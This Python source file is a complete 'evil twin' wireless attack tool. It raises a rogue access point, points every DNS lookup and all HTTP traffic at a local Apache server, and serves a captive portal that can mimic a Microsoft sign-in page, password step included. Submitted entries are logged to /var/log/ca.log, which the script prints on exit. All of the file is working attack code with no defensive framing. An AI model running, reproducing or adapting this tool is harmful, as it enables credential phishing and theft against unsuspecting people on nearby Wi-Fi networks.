import os
import sys
import subprocess
import argparse
import signal
import time
import ipaddress
import shutil


dnsmasq_proc = None
hostapd_proc = None
script_args = None

def run_command(command, suppress_output=True, ignore_errors=False):
    try:
        stdout = subprocess.DEVNULL if suppress_output else None
        stderr = subprocess.DEVNULL if suppress_output else None
        subprocess.run(command, check=True, stdout=stdout, stderr=stderr)
        return True
    except (subprocess.CalledProcessError, FileNotFoundError) as e:
        if not ignore_errors:
            print(f"[-] Error executing command: {' '.join(command)}")
            print(f"[-] Details: {e}")
        return False

def check_root():
    if os.geteuid() != 0:
        print("[-] This script must be run as root. Please use 'sudo'.")
        sys.exit(1)
    print("[+] Root privileges confirmed.")

def check_dependencies():
    dependencies = ['apache2', 'php', 'hostapd', 'dnsmasq']
    print("[*] Checking for required packages...")
    missing = []
    for dep in dependencies:
        if subprocess.call(['dpkg-query', '-W', '-f=${Status}', dep], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) != 0:
            missing.append(dep)

    if missing:
        print("[-] The following required packages are not installed:")
        for pkg in missing:
            print(f"  - {pkg}")
        print("[-] Please install them manually before running this script.")
        print("[-] Example: sudo apt update && sudo apt install -y " + " ".join(missing))
        sys.exit(1)
    print("[+] All dependencies are installed.")

def manage_service(service_name, action='stop'):
    service_cmd = ['systemctl', action, service_name]
    print(f"[*] Attempting to {action} {service_name}...")
    run_command(service_cmd, ignore_errors=True)
    print(f"[+] {service_name} {action} command issued.")

def toggle_ip_forwarding(enable=True):
    action = "Enabling" if enable else "Disabling"
    value = "1" if enable else "0"
    print(f"[*] {action} IP forwarding...")
    try:
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
            f.write(value)
        return True
    except IOError as e:
        print(f"[-] Failed to {action.lower()} IP forwarding: {e}")
        return False

def configure_interface(iface, network_str):
    print(f"[*] Configuring interface {iface}...")
    try:
        network = ipaddress.ip_network(network_str)
        ip_addr = str(next(network.hosts()))
        
        commands = [
            ['ip', 'link', 'set', iface, 'down'],
            ['ip', 'addr', 'flush', 'dev', iface],
            ['ip', 'addr', 'add', f"{ip_addr}/{network.prefixlen}", 'dev', iface],
            ['ip', 'link', 'set', iface, 'up']
        ]
        
        for cmd in commands:
            if not run_command(cmd):
                raise Exception(f"Failed to execute: {' '.join(cmd)}")
                
        print(f"[+] Interface {iface} configured with IP {ip_addr}")
        return ip_addr
    except Exception as e:
        print(f"[-] Failed to configure interface: {e}")
        sys.exit(1)

def create_dnsmasq_conf(iface, ip_addr, network_str):
    print("[*] Creating dnsmasq.conf...")
    try:
        network = ipaddress.ip_network(network_str)
        dhcp_start = str(network.network_address + 10)
        dhcp_end = str(network.network_address + 100)
        
        config_content = f"""
interface={iface}
bind-interfaces
no-resolv
log-queries
dhcp-range={dhcp_start},{dhcp_end},12h
dhcp-option=3,{ip_addr}
dhcp-option=6,{ip_addr}
address=/#/{ip_addr}
address=/captive.apple.com/{ip_addr}
address=/www.msftconnecttest.com/{ip_addr}
address=/connectivitycheck.gstatic.com/{ip_addr}
"""
        with open("dnsmasq.conf", "w") as f:
            f.write(config_content.strip())
        print("[+] dnsmasq.conf created successfully.")
    except Exception as e:
        print(f"[-] Failed to create dnsmasq.conf: {e}")
        sys.exit(1)

def create_hostapd_conf2_4(iface, ssid, channel):
    print("[*] Creating hostapd.conf...")
    config_content = f"""
interface={iface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
auth_algs=1
wmm_enabled=0
"""
    try:
        with open("hostapd.conf", "w") as f:
            f.write(config_content.strip())
        print("[+] hostapd.conf created successfully.")
    except Exception as e:
        print(f"[-] Failed to create hostapd.conf: {e}")
        sys.exit(1)

def create_hostapd_conf5(iface, ssid, channel):
    print("[*] Creating hostapd.conf...")
    config_content = f"""
interface={iface}
driver=nl80211
ssid={ssid}
hw_mode=a
channel={channel}
auth_algs=1
wmm_enabled=1
"""
    try:
        with open("hostapd.conf", "w") as f:
            f.write(config_content.strip())
        print("[+] hostapd.conf created successfully.")
    except Exception as e:
        print(f"[-] Failed to create hostapd.conf: {e}")
        sys.exit(1)

def setup_apache():
    print("[*] Setting up Apache2...")
    commands = [
        ['systemctl', 'start', 'apache2'],
        ['a2enmod', 'rewrite'],
        ['a2enmod', 'headers'],
        ['systemctl', 'restart', 'apache2']
    ]
    for cmd in commands:
        if not run_command(cmd):
            print(f"[-] Failed to configure Apache. Aborting.")
            sys.exit(1)
    print("[+] Apache2 configured and started.")



def setup_captive_portal_files(Cap: str):
    portal_dir = "/var/www/captive"
    print(f"[*] Setting up captive portal files in {portal_dir}...")
    
    if not os.path.exists("index.html") or not os.path.exists("save.php"):
        print("[-] Error: 'index.html' and/or 'save.php' not found in the current directory.")
        sys.exit(1)
        
    if not os.path.exists(portal_dir):
        print(f"[*] Directory {portal_dir} not found. Creating...")
        if not run_command(['mkdir', '-p', portal_dir]):
            sys.exit(1)
    
    try:
        print("[*] Copying portal files...")
        if Cap == "default":
            shutil.copy("Default/index.html", os.path.join(portal_dir, "index.html"))
            shutil.copy("Default/save.php", os.path.join(portal_dir, "save.php"))
        if Cap == "microsoft": 
            shutil.copy("Microsoft/index.html", os.path.join(portal_dir, "index.html"))
            shutil.copy("Microsoft/password.php", os.path.join(portal_dir, "password.php"))
            shutil.copy("Microsoft/save.php", os.path.join(portal_dir, "save.php"))
            shutil.copy("Microsoft/save2.php", os.path.join(portal_dir, "save2.php"))
            shutil.copy("Microsoft/microsoft.svg", os.path.join(portal_dir, "microsoft.svg"))
        
        print("[+] Captive portal files copied successfully.")
    except Exception as e:
        print(f"[-] Failed to copy portal files: {e}")
        sys.exit(1)



def setup_log_file():
    log_file = "/var/log/ca.log"
    print(f"[*] Setting up log file {log_file}...")
    try:
        if not os.path.exists(log_file):
            run_command(['touch', log_file])
        
        www_data_uid = int(subprocess.check_output(['id', '-u', 'www-data']).strip())
        www_data_gid = int(subprocess.check_output(['id', '-g', 'www-data']).strip())
        
        os.chown(log_file, www_data_uid, www_data_gid)
        os.chmod(log_file, 0o640)
        print("[+] Log file permissions set correctly.")
    except Exception as e:
        print(f"[-] Failed to set up log file: {e}")
        sys.exit(1)


def create_vhost():
    vhost_file = "/etc/apache2/sites-available/captive.conf"
    print(f"[*] Creating VirtualHost file: {vhost_file}...")
    
    vhost_content = r"""
<VirtualHost *:80>
    ServerName captive.portal
    ServerAlias *
    DocumentRoot /var/www/captive
    <Directory /var/www/captive>
        AllowOverride All
        Require all granted
    </Directory>
    Alias /hotspot-detect.html /var/www/captive/index.html
    Alias /generate_204 /var/www/captive/index.html
    Alias /connecttest.txt /var/www/captive/index.html
    RewriteEngine On
    RewriteCond %{REQUEST_URI} !^/save\.php$
    RewriteRule ^.*$ /index.html [L]
    Header always set Cache-Control "no-store, no-cache, must-revalidate, max-age=0"
    Header always set Pragma "no-cache"
    Header always set Expires "0"
</VirtualHost>
"""
    try:
        with open(vhost_file, "w") as f:
            f.write(vhost_content.strip())
        print("[+] VirtualHost file created.")
    except Exception as e:
        print(f"[-] Failed to create VirtualHost file: {e}")
        sys.exit(1)


def create_vhost_microsoft():
    vhost_file = "/etc/apache2/sites-available/captive.conf"
    print(f"[*] Creating VirtualHost file: {vhost_file}...")
    
    vhost_content = r"""
<VirtualHost *:80>
    ServerName captive.portal
    ServerAlias *
    DocumentRoot /var/www/captive

    <Directory /var/www/captive>
        AllowOverride None
        Require all granted
        Options -MultiViews
    </Directory>

    Alias /hotspot-detect.html /var/www/captive/index.html
    Alias /generate_204       /var/www/captive/index.html
    Alias /connecttest.txt    /var/www/captive/index.html

    RewriteEngine On
 
    RewriteCond %{REQUEST_URI} !^/(hotspot-detect\.html|generate_204|connecttest\.txt)$


    RewriteRule ^/?(save\.php|password\.php|save2\.php|microsoft\.svg)$ - [L]


    RewriteCond %{REQUEST_FILENAME} -f [OR]
    RewriteCond %{REQUEST_FILENAME} -d
    RewriteRule ^ - [L]

   
    RewriteRule ^ /index.html [L]

    Header always set Cache-Control "no-store, no-cache, must-revalidate, max-age=0"
    Header always set Pragma "no-cache"
    Header always set Expires "0"
    Header always set X-VHost "captive-portal"

    AddType image/svg+xml .svg .svgz

</VirtualHost>
"""
    try:
        with open(vhost_file, "w") as f:
            f.write(vhost_content.strip())
        print("[+] VirtualHost file created.")
    except Exception as e:
        print(f"[-] Failed to create VirtualHost file: {e}")
        sys.exit(1)




def enable_apache_site():
    """Enables the captive portal site and disables the default."""
    print("[*] Enabling captive portal Apache site...")
    commands = [
        ['a2ensite', 'captive.conf'],
        ['a2dissite', '000-default.conf'],
        ['systemctl', 'reload', 'apache2']
    ]
    for cmd in commands:
        if not run_command(cmd):
            print("[-] Failed to enable Apache site. Aborting.")
            sys.exit(1)
    print("[+] Apache site enabled.")


def setup_iptables(iface):
    """Sets up iptables rules for redirection."""
    print("[*] Setting up iptables rules...")
    commands = [
        ['iptables', '-t', 'nat', '-A', 'PREROUTING', '-i', iface, '-p', 'tcp', '--dport', '80', '-j', 'REDIRECT', '--to-ports', '80'],
        ['iptables', '-t', 'nat', '-A', 'PREROUTING', '-i', iface, '-p', 'udp', '--dport', '53', '-j', 'REDIRECT', '--to-ports', '53'],
        ['iptables', '-t', 'nat', '-A', 'PREROUTING', '-i', iface, '-p', 'tcp', '--dport', '53', '-j', 'REDIRECT', '--to-ports', '53']
    ]
    for cmd in commands:
        if not run_command(cmd):
            print("[-] Failed to set up iptables. Aborting.")
            cleanup(0, 0)
            sys.exit(1)
    print("[+] Iptables rules configured.")

def start_attack():
    """Kills previous processes and starts dnsmasq and hostapd."""
    global dnsmasq_proc, hostapd_proc
    print("[*] Starting the attack...")
    
    subprocess.run(['pkill', 'dnsmasq'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(1)
    
    try:
        print("[*] Starting dnsmasq...")
        dnsmasq_proc = subprocess.Popen(['dnsmasq', '-C', 'dnsmasq.conf', '-d'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        print("[*] Starting hostapd...")
        hostapd_proc = subprocess.Popen(['hostapd', 'hostapd.conf'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        time.sleep(2)
        
        if dnsmasq_proc.poll() is not None:
            stdout, stderr = dnsmasq_proc.communicate()
            print("[-] dnsmasq failed to start. Error output:")
            print(stderr.decode().strip())
            raise Exception("dnsmasq failed.")

        if hostapd_proc.poll() is not None:
            stdout, stderr = hostapd_proc.communicate()
            print("[-] hostapd failed to start. Error output:")
            print(stderr.decode().strip())
            raise Exception("hostapd failed.")
            
        print("\n[+] EVIL TWIN IS RUNNING!")
        print(f"[+] SSID: {script_args.ssid} on Channel: {script_args.channel}")
        print("[+] Press CTRL+C to stop the attack and clean up.")
        
    except Exception as e:
        print(f"[-] Failed to start attack processes.")
        cleanup(0, 0)
        sys.exit(1)

def cleanup(signum, frame):
    """Cleans up the system upon script termination."""
    print("\n\n[*] CTRL+C detected. Cleaning up...")
    
    if dnsmasq_proc:
        dnsmasq_proc.terminate()
        print("[*] Terminated dnsmasq.")
    if hostapd_proc:
        hostapd_proc.terminate()
        print("[*] Terminated hostapd.")
    run_command(['pkill', 'dnsmasq'], ignore_errors=True)

    if script_args:
        print("[*] Removing iptables rules...")
        rules = [
            ['-t', 'nat', '-D', 'PREROUTING', '-i', script_args.iface, '-p', 'tcp', '--dport', '80', '-j', 'REDIRECT', '--to-ports', '80'],
            ['-t', 'nat', '-D', 'PREROUTING', '-i', script_args.iface, '-p', 'udp', '--dport', '53', '-j', 'REDIRECT', '--to-ports', '53'],
            ['-t', 'nat', '-D', 'PREROUTING', '-i', script_args.iface, '-p', 'tcp', '--dport', '53', '-j', 'REDIRECT', '--to-ports', '53']
        ]
        for rule in rules:
            run_command(['iptables'] + rule, ignore_errors=True)

    toggle_ip_forwarding(enable=False)

    if script_args:
        print(f"[*] Flushing IP from {script_args.iface}...")
        run_command(['ip', 'addr', 'flush', 'dev', script_args.iface], ignore_errors=True)
    
    manage_service('systemd-resolved', 'start')
    manage_service('NetworkManager', 'start')

    log_file = "/var/log/ca.log"
    if os.path.exists(log_file):
        print(f"[*] Displaying contents of {log_file}:")
        try:
            with open(log_file, "r") as f:
                content = f.read().strip()
                if content:
                    print("-" * 40)
                    print(content)
                    print("-" * 40)
                else:
                    print("[*] Log file is empty.")
        except Exception as e:
            print(f"[-] Could not read log file: {e}")
        
        print(f"[*] Removing {log_file}...")
        os.remove(log_file)
        
    print("[*] Stopping Apache2 and cleaning configuration...")
    run_command(['systemctl', 'stop', 'apache2'], ignore_errors=True)
    run_command(['a2dissite', 'captive.conf'], ignore_errors=True)
    run_command(['a2ensite', '000-default.conf'], ignore_errors=True)
    run_command(['systemctl', 'start', 'apache2'], ignore_errors=True) # Start before reload
    run_command(['systemctl', 'reload', 'apache2'], ignore_errors=True)
    if os.path.exists("/etc/apache2/sites-available/captive.conf"):
        os.remove("/etc/apache2/sites-available/captive.conf")

    portal_dir = "/var/www/captive"
    if os.path.exists(portal_dir):
        print(f"[*] Removing directory {portal_dir}...")
        shutil.rmtree(portal_dir)

    if os.path.exists("dnsmasq.conf"):
        os.remove("dnsmasq.conf")
    if os.path.exists("hostapd.conf"):
        os.remove("hostapd.conf")
        
    print("[+] Cleanup complete. Exiting.")
    sys.exit(0)

def main():
    """Main function to orchestrate the setup and attack."""
    global script_args
    
    parser = argparse.ArgumentParser(description="Just loving your neighbor")
    parser.add_argument('--iface', required=True, help="Wireless interface to use ( wlan0)")
    parser.add_argument('--ssid', required=True, help="SSID for the fake network")
    parser.add_argument('--channel', required=True, type=int, help="Channel for the network")
    parser.add_argument('--network', required=True, help="Network address in CIDR format ( 192.168.50.0/24)")
    parser.add_argument("--band", dest="band", required=True, choices=["2.4", "5"], help="Choose WiFi band: 2.4GHz or 5GHz")
    parser.add_argument("--CaptivePortal", dest="Cap", choices=["default", "microsoft"], default="default", help="Choose Your Captive Portal")
    script_args = parser.parse_args()

    check_root()
    check_dependencies()
    
    signal.signal(signal.SIGINT, cleanup)
    
    manage_service('NetworkManager', 'stop')
    manage_service('systemd-resolved', 'stop')
    time.sleep(1)
    
    ip_addr = configure_interface(script_args.iface, script_args.network)
    create_dnsmasq_conf(script_args.iface, ip_addr, script_args.network)

    CH_24 = set(range(1, 14))
    CH_5_NON_DFS = {36, 40, 44, 48, 149, 153, 157, 161, 165}

    if script_args.band == "2.4" and script_args.channel not in CH_24:
        parser.error(f"--channel {script_args.channel} Use channels from 1-14")
    if script_args.band == "5" and script_args.channel not in CH_5_NON_DFS:
        parser.error(f"--channel {script_args.channel} Use channels from 36, 40, 44, 48, 149, 153, 157, 161, 165")
    if script_args.band == '2.4':
        create_hostapd_conf2_4(script_args.iface, script_args.ssid, script_args.channel)
    if script_args.band == '5':
        create_hostapd_conf5(script_args.iface, script_args.ssid, script_args.channel)
    setup_apache()
    if script_args.Cap == 'default':
        setup_captive_portal_files("default")
    if script_args.Cap == 'microsoft':
        setup_captive_portal_files("microsoft")
    setup_log_file()

    if script_args.Cap == 'default':
        create_vhost()
    if script_args.Cap == 'microsoft':
        create_vhost_microsoft()

    enable_apache_site()
    
    if not toggle_ip_forwarding(enable=True):
        cleanup(0, 0)
        sys.exit(1)

    setup_iptables(script_args.iface)
    
    start_attack()
    
    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()
